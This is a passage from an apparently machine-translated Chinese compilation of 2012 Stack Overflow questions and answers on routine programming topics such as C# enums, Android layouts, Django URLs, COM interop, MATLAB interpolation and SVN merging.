    FavoritesList = 2,
    ContentBlock = 3,
    Topic = 6,
    List = 7
}; 
```

在这里，我试图检查我的方法的结果是否等于枚举的值，但出现错误：

```
GetRowType(content) == CONTENT.Topic 
```

有人可以就我做错了什么给我一些建议吗？

```
Gives me an error: Error    2   
Operator '==' cannot be applied to operands of type 'int' and 'Storage.Constants.CONTENT' 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T17:27:42.277

只需将枚举值显式转换为 int

```
GetRowType(content) == (int)CONTENT.Topic 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T17:28:19.330

您必须将枚举显式转换为 int：

```
(int)CONTENT.Topic 
```

话虽如此，您的方法返回枚举可能更有意义（这次将您的 int 显式转换为方法中的枚举）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T17:34:15.680

整个想法是直接使用枚举。所以要修复你的方法并返回一个枚举而不是一个整数：

```
public CONTENT GetRowType(string pk) 
{
    int temp = Convert.ToInt32(pk.Substring(2, 2));
    if (Enum.IsDefined(typeof(CONTENT), temp)) 
    { 
        return (CONTENT)temp;
    }
    else throw new IndexOutOfRangeException();
} 
```

# android - 使用 XML 布局作为模板以编程方式创建 android 按钮

> ID：12429255
> 
> 赞同：7
> 
> 时间：2012-09-14T17:26:31.330
> 
> 标签：android, android-layout, android-xml, android-button

我有一个包含 TextView 的 LinearLayout，并且总是如此。TextView 下方也始终至少有一个按钮，但在某些情况下可能不止一个。

我可以通过编程成功地创建和添加我需要的任意数量的按钮。我还可以通过编程方式成功设置这些按钮所需的任何外观相关参数/选项。

问题是我不知道如何告诉以编程方式创建的按钮它应该使用包含外观和布局参数的 XML 资源文件，而不是以编程方式设置这些参数。

我查看了类似名称的问题，并花时间弄乱 API 本身，但无济于事。

编辑：
这是我正在尝试做的一个近似值，希望能让我的解释更清楚：

```
private TextView textView;
private SomeObject someObject;

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, 
    Bundle savedInstanceState) {
    View scrollView = inflater.inflate(R.layout.fragment_play_game, container, false);
    textView = (TextView) scrollView.findViewById(R.id.game_data_text);
    textView.setText(someObject.getTextForTextView());

    LinearLayout layout = (LinearLayout) scrollView.findViewById(R.id.game_data_container);
    for (String optionText : someObject.getTextForButtons()) {
        layout.addView(createOptionButton(optionText, layout));
    }
    return scrollView;
}

private View createOptionButton(String optionText, LinearLayout layout) {
    Button optionButton = new Button(this.getActivity());
    // set button layout/options here, somehow??
    optionButton.setText(optionText);
    return optionButton;
} 
```

我的片段的 XML 布局文件看起来像这样（这是我试图添加按钮的 LinearLayout）：

```
<?xml version="1.0" encoding="utf-8"?>

<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/game_data_container"
        etc... >

        <TextView 
           android:id="@+id/game_data_text"
           etc... />

    </LinearLayout>

</ScrollView> 
```

另外，如果我要为按钮创建一个 XML 布局文件（我们称之为 custom_button.xml），它应该看起来像这样吗？：

```
<?xml version="1.0" encoding="utf-8"?>
    <Button xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/play_game_option_button"
        etc... /> 
```

**更新：**
只是为了扩展一下 MrFox@ 正在谈论的内容，我为使其正常工作所做的就是替换这一行：

```
Button optionButton = new Button(this.getActivity()); 
```

有了这个：

```
Button optionButton = (Button) inflater.inflate(R.layout.play_game_option_button, layout, false); 
```

...它膨胀了一个只包含按钮布局（按钮模板）的 xml 文件。在这种情况下，它返回该文件的根视图，它只是按钮，因为文件中的按钮上方没有父级。

但是，如果我将最后一个布尔值 (attachToParent) 设置为 true，它将返回按钮所在的根容器（这只是传递给调用的“布局”变量）。

我现在可以使用此模板生成任意数量的按钮。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T17:42:38.930

您是否想过制作一个仅包含应用 XML 样式的按钮的布局，然后将其膨胀到您的线性布局中？

就像是：

inflater.inflate(R.layout.StyledButton, MyLinearLayout, true);

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-03-19T19:32:37.637

xml 为您的按钮下`/res/layout/my_button_layout.xml`

```
<Button xmlns:android="http://schemas.android.com/apk/res/android"
   ... /> 
```

活动中的代码

```
myButton = (Button)inflate.inflate(R.layout.my_button_layout, null);
myView.addView(myButton); 
```

# sql-server - SQL Server CE 4.0 会员数据库 - 无法通过网站管理工具进行连接

> ID：12429261
> 
> 赞同：0
> 
> 时间：2012-09-14T17:26:54.160
> 
> 标签：sql-server, asp.net-membership, asp.net-mvc-4, visual-studio-2012

使用 Visual Studio 2012，我创建了一个新的 ASP.NET MVC 4 Web 项目，使用 NuGet，我安装了“Microsoft SQL Server CE 4.0 Universal providers for SQL compact Edition”。

之后：

我发现 aspnet.sdf SQL Server CE 4.0 数据库位于我的 App_Data 文件夹中

我在我的 MVC 网站上注册成功，提供了用户名和密码，我可以登录。

当我显示 \App_Data\aspnet.sdf 用户表时，我找不到任何记录。

这里的问题是，当我单击 VS 菜单：**项目**- > **Asp.net 配置**时，我在浏览器上获得注册用户的“**网站管理工具**”，我假设这里使用的数据库不一样在我的网站上创建。当我想在“安全安装向导”中更改数据存储时，我收到下一条消息：“*您的应用程序当前配置为使用： **高级设置供应商** 要更改应用程序的数据存储，请关闭向导，然后单击安全配置选项卡提供程序。您可以使用此选项卡配置如何存储数据管理网站。* "

当我转到安全配置选项卡提供程序时，单击找到的唯一提供程序旁边的测试链接：AspNetSqlProvider，我收到以下消息：

"*无法建立与数据库的连接。如果尚未创建SQL Server数据库，请退出网站管理工具，使用命令行实用程序创建并配置aspnet_regsql数据库，然后返回此工具设置提供者。*"

请指教怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-16T20:38:09.477

由于 MVC4 模板使用简单成员资格，因此“网站管理工具”不适用于简单成员资格。在这种情况下不支持

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-10T10:26:18.060

我敢打赌这是因为默认的 aspnetsqlprovider 在 machine.config 中使用了这个连接字符串“data source =.\sqlexpress”。但是，如果您使用 MS SQL CE，您的连接应该是“Data Source=aspnet.sdf”（您可以从 connectionstrings.com 检查正确的连接字符串）

# actionscript-3 - 如何在 AS3 中正确设置 Mouseenabled

> ID：12429265
> 
> 赞同：1
> 
> 时间：2012-09-14T17:27:05.943
> 
> 标签：actionscript-3, flash, movieclip

我有一个背景影片剪辑，上面有飞行的物体（这是一个游戏）。现在，当没有击中位于顶部的物体时，我想在影片剪辑中拍摄孔。我在后台 mc 和子 mc 上都摆弄了 mouseEnabled，但没有任何成功。区分这两个事件（背景撞击与飞行物体撞击）的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:55:34.300

如果您在背景和飞行对象的共同父对象上侦听鼠标事件，则可以使用该`event.target`属性来查看哪个项目调度了该事件。

将显示对象的`mouseEnabled`属性设置为 false 会阻止它调度鼠标事件，但是，它不会阻止它的子级这样做。 `mouseChildren = false`将实现这一点。

因此，如果在您的飞行物和背景上，您将它们的`mouseChildren`属性设置为 false，那么当您单击它们时，目标属性将始终是对象本身。（否则目标可能是它的孩子）。

因此您的事件处理程序可能如下所示：

```
function(e:Event):void {
    if(e.target == myBackgroundInstance){
        //do something with the background
    }

    if(e.target is myCommonFlyingThingClass){
        var flyingThing:myCommonFlyingThingClass = e.target as myCommonFlyingThingClass;
        //do something with the flying thing
    }
} 
```

# python - “模块”对象没有属性“主页面”

> ID：12429270
> 
> 赞同：2
> 
> 时间：2012-09-14T17:27:45.023
> 
> 标签：python, django, django-models

运行命令后，`./manage.py runserver`我收到以下错误。我知道这肯定与 Urls.py 有关`(r'^$',views.main_page),`，但似乎无法弄清楚需要更改什么......有什么建议吗？

**网址.py**

```
from django.conf.urls import patterns, include, url
from django.contrib import admin
from content import views

admin.autodiscover()

urlpatterns = patterns('',
# Examples:
# url(r'^$', 'crosstalk.views.home', name='home'),
# url(r'^crosstalk/', include('crosstalk.foo.urls')),

# Uncomment the admin/doc line below to enable admin documentation:
# url(r'^admin/doc/', include('django.contrib.admindocs.urls')),

# Uncomment the next line to enable the admin:
(r'^$',views.main_page),
(r'^admin/', include(admin.site.urls)),
(r'^js/(?P<path>.*)$', 'django.views.static.serve', {'document_root': 'templates/js'}),
(r"^(\d+)/$", "post"),
) 
```

**模型.py**

```
from django.db import models
from datetime   import datetime

class Cover(models.Model):  
title = models.CharField(max_length=200)
slug = models.SlugField(unique=True)
text = models.TextField()
posts = models.ManyToManyField('Post')
def __unicode__(self):
    return self.title

class Post(models.Model):  
title = models.CharField(max_length=200)
slug = models.SlugField(unique=True)
date = models.DateTimeField(default=datetime.now)
text = models.TextField()

def __unicode__(self):
    return self.title 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:33:12.917

你没有`main_page`在`views.py`. 这样做，包括适当的处理，它应该工作。

它应该看起来像这样：

```
def main_page(request):
    # view stuff goes here
    return something 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:31:25.773

检查你`main_page`的`views.py`. 更好的方法是将其放在引号中

```
(r'^$','content.views.main_page') 
```

假设这`content`是您的应用名称。

# c++ - 单击项目时禁用自动滚动

> ID：12429272
> 
> 赞同：2
> 
> 时间：2012-09-14T17:28:04.033
> 
> 标签：c++, qt, qtreeview, qscrollarea

我有一个带有自定义项目委托的 QTreeView。委托创建了一个非常宽的编辑器（比如说，2000 像素宽度），因此用户将水平滚动以编辑数据。

![步骤1](../Images/2319df37c7162bec19ca188c7b52bd1a.png)

图 1：我滚动到第 300 帧。请注意，滚动条已经偏移。

[第 2 步 http://imageshack.us/a/img801/9887/image2zb.png](http://imageshack.us/a/img801/9887/image2zb.png)

图 2：我点击编辑器的某个部分；然后滚动条自动转到起始位置。发生这种情况是因为当前选定的行已更改。有什么办法可以禁用自动滚动？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:06:15.390

使用属性[QAbstractItemView::autoScroll](http://doc.qt.nokia.com/4.7-snapshot/qabstractitemview.html#autoScroll-prop)解决。所以，我所要做的就是`myTreeView->setAutoScroll(false);`。

# language-agnostic - 一种优雅的方式插入列表

> ID：12429273
> 
> 赞同：1
> 
> 时间：2012-09-14T17:28:11.637
> 
> 标签：language-agnostic

所以，我有一个对象列表，我想更新符合某些条件的项目，如果没有匹配项则插入一个对象。我想出的代码看起来并不优雅，它是这样的：

```
def upsert(type, text)
  messages.each do |message|
    if message.type == type
      message.text = text
    end
  end

  unless messages.any?{|message| message.type == type}
    messages.insert(Message.new(type, text))
  end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:46:27.357

这取决于列表本身的实现。如果您可以使用每个元素的唯一哈希来实现您的列表，那么获取一个元素可能非常简单。

所以归结为列表本身的实现。如果它是某种随机访问列表（随时间获取常量），则此操作将很简单。如果列表是纯顺序访问列表，则此选项与您的实现相同。

例如，在使用 Java 时，[`ArrayList`](http://docs.oracle.com/javase/6/docs/api/java/util/ArrayList.html)我会这样做：

假设“类型”唯一标识一个元素，我将在 Item 类中有一个[正确](http://www.ibm.com/developerworks/java/library/j-jtp05273/index.html)定义[`equals`](http://docs.oracle.com/javase/6/docs/api/java/lang/Object.html#equals%28java.lang.Object%29)的元素。[`hashcode`](http://docs.oracle.com/javase/6/docs/api/java/lang/Object.html#hashCode%28%29)

```
if(list.contains(item))
{
    Item item = list.get(list.indexOf(item));
    item.setText(text);
}
else
{
    list.add(item);
} 
```

如果`type`不是唯一的，仍然可以实现。底线是清单的实施。有了一个好的随机访问列表，事情几乎总是很简单：

```
if(!list.contains(item))
{
    return;
}
do
{
    int i = list.indexOf(item);
    Item item = list.get(i);
    item.setText(text);
    list = list.subList(i+1, list.size());
} while(list.indexOf(item) != list.lastIndexOf(item)); 
```

# dataset - 使用 Pandas + PyTables 管理和处理数据集的设计策略

> ID：12429279
> 
> 赞同：0
> 
> 时间：2012-09-14T17:28:29.323
> 
> 标签：dataset, pandas, pytables

作为 numpy 的普通用户，我爱上了 Pandas 的语法和概念，并开始阅读 PyTables，它看起来非常健壮且面向性能。

我的主要疑问是：

*   如果我要使用由 Pandas + PyTables 组成的自制框架，应该将数据处理管道的哪一层（数据导入、转换、分析、存储、检索）委托给每一层？
*   Pandas 的天赋是什么，它与 PyTables 的天赋有什么关系，它们的天赋有什么关系？
*   它们是正交/互补/独立，还是以某种方式重叠功能？
*   它们如何彼此区分开来？

谢谢你的光！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T02:45:53.897

pandas 和 pytables 之间没有太多重叠，但它们是很好的互补。PyTables 是关于存储和检索的，而 pandas 是关于在检索之后和​​存储之前处理数据的。Pandas 具有与 PyTables 的便捷接口（查看 pandas.io.pytables.HDFStore），因此您可以使用 pytables 轻松存储 pandas Series/DataFrame。

# c++ - 在 C++ 中使用托管 COM 对象

> ID：12429282
> 
> 赞同：1
> 
> 时间：2012-09-14T17:28:40.427
> 
> 标签：c++, com, mfc, comobject, com-object

我已经学习了许多关于如何在 C++ 中使用 COM 对象的详细教程。我正在使用 VS 2010 专业版。我做了一个新的解决方案，叫做`TestComInterop`. 制作了一个名为`TestMath`. 通过选择 中的选项使其可见`properties->Assembly Information->Make assembly COM-visible`。然后我去了 Signing 属性，签署了名为`MyMathCom.snk`（无密码）的程序集。然后我使用`GUID generator`并制作了 2 个 GUID。然后把这段代码放到我的程序中编译。（成功）

```
using System.Runtime.InteropServices;
namespace TestMath
{
    [Guid("599AD473-B0A9-4A6E-B260-CF6FDEBF151B"),InterfaceType(ComInterfaceType.InterfaceIsDual)]
    public interface IClass1
    {
        void AddNumbers(byte[] array);
    }
    [Guid("62FBC3A9-E2C0-4B53-9BF3-FDE22AA0CFF2"),ClassInterface(ClassInterfaceType.None)]
    public class Class1 : IClass1
    {

        public void AddNumbers(byte[] array)
        {
            ulong number = 0;
            foreach (var item in array)
            {
                number += item;
            }
            System.Console.WriteLine("The answer is {0}", number);
            System.Windows.Forms.MessageBox.Show("DOrk");
        }
    }
} 
```

然后我为控制台应用程序制作了一个 C++ 项目。允许的 MFC。

然后我添加了一个`Typelib`MFC 类。我能够使用下拉框找到`TestMath<1.0>`并且它有我的`iClass1`. 我选择了它，它为我制作了头文件

```
// Machine generated IDispatch wrapper class(es) created with Add Class from Typelib Wizard

#import "C:\\Users\\rsny\\Desktop\\TestComInterop\\TestComInterop\\TestMath\\bin\\Debug\\TestMath.tlb" no_namespace
// CClass1 wrapper class

class CClass1 : public COleDispatchDriver
{
public:
    CClass1(){} // Calls COleDispatchDriver default constructor
    CClass1(LPDISPATCH pDispatch) : COleDispatchDriver(pDispatch) {}
    CClass1(const CClass1& dispatchSrc) : COleDispatchDriver(dispatchSrc) {}

    // Attributes
public:

    // Operations
public:

    // IClass1 methods
public:
    void AddNumbers(SAFEARRAY * array)
    {
        static BYTE parms[] = {VTS_NONE} ;
        InvokeHelper(0x60020000, DISPATCH_METHOD, VT_EMPTY, NULL, parms, array);
    }

    // IClass1 properties
public:

}; 
```

编译，它为我制作了`tlh`和`tli`文件..成功..

所以最后一步是运行我的代码。打开`TestComInterop.cpp`，这是我找不到“标准”的方式。我尝试了各种不同的东西，但不确定要放入什么......这是我的代码

```
// TestComInterop.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "TestComInterop.h"
#include "CClass1.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// The one and only application object

CWinApp theApp;

using namespace std;

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
    int nRetCode = 0;

    HMODULE hModule = ::GetModuleHandle(NULL);

    if (hModule != NULL)
    {
        // initialize MFC and print and error on failure
        if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
        {
            // TODO: change error code to suit your needs
            _tprintf(_T("Fatal Error: MFC initialization failed\n"));
            nRetCode = 1;
        }
        else
        {
            // TODO: code your application's behavior here.
        }
    }
    else
    {
        // TODO: change error code to suit your needs
        _tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
        nRetCode = 1;
    }
    CClass1* myMath = new CClass1;
    myMath->CreateDispatch("62FBC3A9-E2C0-4B53-9BF3-FDE22AA0CFF2");
    //bool result = myMath.
    if (myMath)
        cout << "AWESOME" << endl;
    else
        cout << "LAME" << endl;

    unsigned char numbers[5] = {0x01,0x02,0x03,0x04,0x05};
    myMath->AddNumbers((SAFEARRAY*)numbers);
    delete myMath;
    getchar();
    return nRetCode;
} 
```

现在我期待它将答案粘贴到我的控制台..但什么也没有。我也期待它显示一个消息框......什么都没有。至少可以说我是 COM 对象的新手。到目前为止，使用所有工具等并不太难做到这一点......但对于我的生活，我无法让它发挥作用。

以防万一这里需要的是我的`tlh`和`tli`文件。

```
// Created by Microsoft (R) C/C++ Compiler Version 10.00.30319.01 (e323d9ba).
//
// c:\users\rsny\desktop\testcominterop\testcominterop\testcominterop\debug\testmath.tli
//
// Wrapper implementations for Win32 type library C:\\Users\\rsny\\Desktop\\TestComInterop\\TestComInterop\\TestMath\\bin\\Debug\\TestMath.tlb
// compiler-generated file created 09/14/12 at 12:08:08 - DO NOT EDIT!

#pragma once

//
// interface IClass1 wrapper method implementations
//

inline HRESULT IClass1::AddNumbers ( SAFEARRAY * array ) {
    HRESULT _hr = raw_AddNumbers(array);
    if (FAILED(_hr)) _com_issue_errorex(_hr, this, __uuidof(this));
    return _hr;
}

// Created by Microsoft (R) C/C++ Compiler Version 10.00.30319.01 (e323d9ba).
//
// c:\users\rsny\desktop\testcominterop\testcominterop\testcominterop\debug\testmath.tlh
//
// C++ source equivalent of Win32 type library C:\\Users\\rsny\\Desktop\\TestComInterop\\TestComInterop\\TestMath\\bin\\Debug\\TestMath.tlb
// compiler-generated file created 09/14/12 at 12:08:08 - DO NOT EDIT!

#pragma once
#pragma pack(push, 8)

#include <comdef.h>

//
// Forward references and typedefs
//

struct __declspec(uuid("d29ff1b5-bf10-4bbe-9bd9-cb5346f4bfaf"))
/* LIBID */ __TestMath;
struct __declspec(uuid("599ad473-b0a9-4a6e-b260-cf6fdebf151b"))
/* dual interface */ IClass1;
struct /* coclass */ Class1;

//
// Smart pointer typedef declarations
//

_COM_SMARTPTR_TYPEDEF(IClass1, __uuidof(IClass1));

//
// Type library items
//

struct __declspec(uuid("599ad473-b0a9-4a6e-b260-cf6fdebf151b"))
IClass1 : IDispatch
{
    //
    // Wrapper methods for error-handling
    //

    HRESULT AddNumbers (
        SAFEARRAY * array );

    //
    // Raw methods provided by interface
    //

      virtual HRESULT __stdcall raw_AddNumbers (
        /*[in]*/ SAFEARRAY * array ) = 0;
};

struct __declspec(uuid("62fbc3a9-e2c0-4b53-9bf3-fde22aa0cff2"))
Class1;
    // interface _Object
    // [ default ] interface IClass1

//
// Wrapper method implementations
//

#include "c:\users\rsny\desktop\testcominterop\testcominterop\testcominterop\debug\testmath.tli"

#pragma pack(pop) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T19:21:51.017

我不知道你为什么使用`COleDispatchDriver`派生类。

当您提到 .tlh/tli 文件时，我假设您已经导入了 TLB 文件。

所以你需要使用它是这样的（直接从头开始写，所以请忽略可能的错误）：

```
// prepare values
unsigned char numbers[] = {0x01,0x02,0x03,0x04,0x05};
SAFEARRAY* sa = SafeArrayCreateVector(VT_UI1, 0, 5);
char* data;
SafeArrayAccessData(sa, (void**)&data);
memcpy(data, numbers, 5)
SafeArrayUnaccessData(sa);

// instantiate COM object and call the method
IClass1Ptr obj(_uuidof(Class1));
obj->AddNumbers(sa);  

// clean up
SafeArrayDestroy(sa); 
```

如果您使用 ATL，我建议您使用`CComSafeArray`它，因为它可以消除使用 SAFEARRAY 的很多痛苦。

# image - 随机像素的图像插值

> ID：12429283
> 
> 赞同：8
> 
> 时间：2012-09-14T17:29:03.547
> 
> 标签：image, matlab, image-processing, numerical-analysis

我想问一个关于单通道图像插值的问题。为简单起见选择单通道，否则我正在处理多通道图像。假设有一个具有纯黑色背景（像素强度 0）的单通道图像，其中有一些像素具有非零强度值。我想应用一种插值算法来用来自相邻非零强度像素的插值填充图像的整个黑色区域。

对于适用于此问题的平滑插值，您会推荐哪种插值算法？

作为输入，我们当然知道那些非黑色像素的位置及其强度。但是位置有点随机（一行可能是 10 个像素，另一行只有 8 个）。

![在此处输入图像描述](../Images/579e34f0d7303171a628d218cf004e0e.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T17:35:39.267

常规`interp2`在这里不起作用，因为您的点不是定期定位的（不是坐在网格上）。您可以尝试`TriScatteredInterp`或`inpaint_nans`从文件交换器下载。

这是您的解决方案`TriScatteredInterp`：

![在此处输入图像描述](../Images/e31133154abc30aa6c36880925d18a49.png)

```
function solveStackOverflowProblem()
    im = imread('http://i.stack.imgur.com/lMaYR.png');
    im = im(:,:,2);
    [i,j] = find(im);
    y = j; x = i;
    indexes = sub2ind(size(im),i,j);
    interpolator = TriScatteredInterp(x,y,double(im(indexes)));

    [Y,X] = meshgrid( 1:size(im,2),1:size(im,1));
    reconstructedImage = interpolator(X,Y);

    figure;imshow(reconstructedImage/255)
end 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T20:44:50.097

您最好的解决方案是使用[gridfit](http://www.mathworks.com/matlabcentral/fileexchange/8998)。它旨在改进所有原生 Matlab 函数，如 TriScatteredInterp 和 griddata。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-14T18:09:17.273

对于数量相对较少的点，插值它们的理想方法是创建一个三角形网格，仅使用每个区域的顶点来确定该区域内的像素，使用加权平均值来确定每个像素的颜色。

为了找到三角形区域内像素的颜色，每个像素使用的权重分别是 A、B 和 C，对于点 A、B 和 C，分别为 (b *c-A)/a、(a* c-B)/b 和 ( a*bC)/c。这确保了每个点的影响随着点越来越靠近相对边缘而恶化到零，因此三角形之间的过渡是平滑的。

请记住，您可以使用任何类型的平均值，包括谐波和几何，而不仅仅是算术，来进行计算（外观会改变，但其他类型的平均值可能会更好）。

![图标注三角形部分](../Images/df2e50a30bf817a8266aa8f368369b90.png)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-15T13:14:26.413

这是一个基于使用径向基函数（在本例中为高斯函数）为具有不同强度的随机间隔点构建插值的解决方案。

本质上，这会在每个点上放置一个高斯分布，通过点强度对其进行加权并将结果求和。

插值函数的锐度可通过所选高斯函数的标准偏差来控制。

要点：

![数学图形](../Images/542a9d6dc7a9f1c1563be6d85c01184d.png)

插值：

![数学图形](../Images/c3211f344f28cbef6767c64731a58e73.png)

以 3D 形式查看： ![数学图形](../Images/cd815288bd533dd8e73ed842d06ab52f.png)

具有较小的标准偏差： ![数学图形](../Images/addc90a621ffcc51a85fef8282a49b33.png)

编码：

```
pts = Table[{{RandomReal[{0, 200}], RandomReal[{0, 200}]}, 
   RandomReal[]}, {20}]

dists = Function[points, 
  Plus @@ ((PDF[
          MultinormalDistribution[#, 200 IdentityMatrix[2]], {x, 
           y}] & /@ points[[All, 1]] ) points[[All, 2]])/Length@points]

DensityPlot[dists[pts], {x, 0, 200}, {y, 0, 200}, PlotPoints -> 100] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-14T17:33:36.867

对于这几个非零点，任何插值看起来都非常糟糕，但是您可以尝试使用二维滤波器（例如高斯核）对图像进行卷积，看看您是否喜欢它。

# vector - clojure：从 xml 创建地图矢量

> ID：12429284
> 
> 赞同：2
> 
> 时间：2012-09-14T17:29:03.447
> 
> 标签：vector, clojure, xml-parsing, maps

我有一个关于如何在 clojure 中对 xml 文件执行 select * 样式“查询”的问题。说，我有这个 XML，你可以从这个 URL [http://api.eventful.com/rest/events/search?app_key=4H4Vff4PdrTGp3vV&keywords=music&location=Belgrade&date=Future](http://api.eventful.com/rest/events/search?app_key=4H4Vff4PdrTGp3vV&keywords=music&location=Belgrade&date=Future)获得（如果我把它贴在这里它看起来不好的）

我想为 XML 中所有重复的“行”获取地图向量（以标签作为键及其值的地图）。因此，在此示例 XML 中，每个地图都是一个事件。我可以解析它，并制作它的拉链结构。我也知道如何使用结构映射来做到这一点，但我想要一个更通用的解决方案，对于任何给定的 xml，也许还有一些开始的标签。我想要的与此[Simple Clojure XML 编辑](https://stackoverflow.com/questions/11690398/simple-clojure-xml-edit)相反。任何想法都会很棒！

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:30:27.203

你应该看看[enlive](https://github.com/cgrand/enlive)。它将 XML 转换为不同的基于列表/映射的结构，并允许对其进行查询。

例如，要选择所有事件，您必须执行以下操作：

```
(require '[net.cgrand.enlive-html :as html])
(def data (html/xml-resource "your.xml"))
(html/select data [:events]) 
```

获取所有事件标题：

```
(select data [:even :title :*]) 
```

我已经有几个月没有使用它了，所以我有点生疏了。但是网上有很多资料。

编辑：

您实际上可以使用 zippers 来导航由 xml-resource 创建的数据结构。这是一个示例，我在其中查找任何带有单词库的链接，然后从中走出来以获取其父节点。

```
(require [net.cgrand.enlive-html :as html])
(require [net.cgrand.xml :as xml])
(require [clojure.zip :as z])

(map
  (comp z/node z/up)
  (@#'html/zip-select-nodes*
   (map xml/xml-zip (html/html-resource page2))
   (@#'html/automaton
    [:a (html/re-pred #".*[Bb]ank.*")]))) 
```

我必须使用 @#' 作为函数 zip-select-nodes* 和自动机是命名空间私有的。

# xamarin.android - 如何在 Monodroid 中使用 dropnet、sharpbox 和其他库

> ID：12429286
> 
> 赞同：1
> 
> 时间：2012-09-14T17:29:07.277
> 
> 标签：xamarin.android

我在图像上传器上创建了一个桌面应用程序。现在我想使用 Monodroid 将它移植到 Android。应用程序将图像上传到 Dropbox。在桌面版本中，我使用了引用“sharpbox”、“Json”等的“dropnet”。有什么方法可以在我的 monodroid 应用程序中使用这些，即 dropnet、sharpbox 等？

如果我必须重新编码 .net 中已经可用的那些库，这将需要很长时间。

谢谢。苏吉特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T20:02:38.867

DropNet 已经有 MonoTouch 的编译。所以你应该能够以同样的方式创建一个 MonoDroid 编译 - 只需创建一个 MonoDroid 类库项目，将所有文件添加为链接并编译。

您甚至可以将其作为拉取请求提交给 DropNet 项目。

编辑：我在[这里](https://github.com/SpiritMachine/DropNet)分叉了 DropNet ，并创建了一个 MonoDroid 编译。只需克隆此存储库。

Disclamer：我刚刚开始构建它 - 由您来解决您可能遇到的任何问题。

# svn - SVN 从主干合并到包含重新排列文件的分支

> ID：12429287
> 
> 赞同：0
> 
> 时间：2012-09-14T17:29:24.657
> 
> 标签：svn

SVN 1.6.12 问题 - 假设我从主干创建一个分支。

然后在该分支中，我将许多文件重新排列到该分支下的不同目录中（使用 Eclipse 中存储库的服务器视图）。

现在假设有些人在我在分支上工作时正在修改主干文件，我想将他们的更改合并到我的分支中。

如果我从主干中的项目根目录合并回我的分支，即使在移动的文件上也能工作吗？

当然在 CVS 中这永远不会起作用，但是由于 svn 允许您在服务器上移动文件，我认为它足够聪明，知道如何合并已更改目录的文件。

有人知道吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T01:42:33.737

SVN 支持移动文件，所以如果你在你的树干中移动它们

```
svn move 
```

那么这会好起来的。之后你应该可以正常 svn merge 了。但是，如果您的主干当前还有其他分支，则必须小心： [检查此 stackoverflow 合并移动](https://stackoverflow.com/questions/2064321/subversion-cant-merge-after-a-move) 欢呼！

# actionscript-3 - 复杂的 UI 创建

> ID：12429288
> 
> 赞同：0
> 
> 时间：2012-09-14T17:29:33.437
> 
> 标签：actionscript-3, flash

我有一个纯粹用 ActionScript 3.0 编写的 flash 应用程序。

在加载时，我创建了将在应用程序生命周期中使用的所有 UI。UI 创建大约需要 7 秒。我想加快速度。

我不按需创建 UI 的原因是因为我想要一个响应速度非常快的 UI。

在游戏等 Flash 应用程序中处理 UI 创建的最佳实践方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:44:06.777

解决此问题的一种方法是仅创建需要在加载的第一个屏幕上直接看到的内容，然后逐渐加载 UI 的其余部分。当用户必须在屏幕中导航时，这将为您赢得额外的几秒钟。

以游戏为例：

创建开始屏幕 - 3 秒 创建级别选择屏幕 - 2 秒 创建高分屏幕和选项屏幕 - 2 秒

这样，UI 是按照最有可能首先访问的顺序创建的（用户通常不会将点击高分或选项作为他们做的第一件事，因此我们可以暂时推迟 UI 创建）并利用用户导航时通常会有轻微延迟的事实，给我们额外的时间来创建 UI。

因此，弄清楚游戏加载后需要立即创建 UI 的哪些部分，以及您可以承受几秒钟的时间来创建哪些部分，您应该能够实现更快的 UI 创建外观（甚至尽管它确实需要相同的时间）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-15T02:01:07.163

或者你可以只使用时间线。在第 1 帧上显示您的初始图形，然后将其余的放在您为库项目中的“嵌入帧”指定的帧号上。将会发生的是您的初始图形将显示，然后当所有嵌入的类和资产都加载后，您将看到它们。这将使人们在您的文档类甚至能够解决任何问题之前看到一些东西。

# c# - 为什么我的帖子参数没有发送到我的控制器？

> ID：12429292
> 
> 赞同：0
> 
> 时间：2012-09-14T17:29:45.990
> 
> 标签：c#, asp.net-mvc-2, post

单步执行我的代码后，我已经验证了 collection.Get("username"); 在下面的代码中为 null，这意味着我的 post 参数没有进入控制器。谁能发现问题？

控制器：

```
public ActionResult Admin(uint id, FormCollection collection) {
    var username = collection.Get("username");
    var password = collection.Get("password");
    Helper.CreateUser(username,password);
    return View("AdministerUsers");
} 
```

看法：

```
<% using (Html.BeginForm()){ %>
    <fieldset>
    <legend>Fields</legend>
    <label for="username">username</label>
    <%= Html.TextBox("username") %>
